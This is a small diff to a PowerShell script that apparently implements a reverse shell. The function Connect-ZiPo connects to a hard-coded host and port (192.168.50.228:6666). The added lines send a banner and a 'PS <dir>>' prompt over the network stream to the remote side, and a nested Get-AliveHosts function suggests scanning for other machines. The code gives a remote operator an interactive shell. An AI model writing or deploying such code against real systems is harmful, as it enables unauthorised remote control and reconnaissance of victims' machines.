@@ -84,6 +84,10 @@ function Connect-ZiPo {
     $srv = "192.168.50.228"
     $port = 6666
     $currentDir = Get-Location
+    $intro = $clear + $banner + "`nPS $currentDir> "
+    $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
+    $stream.Write($bbytes, 0, $bbytes.Length)
+    $stream.Flush()
 
 
     function Get-AliveHosts {
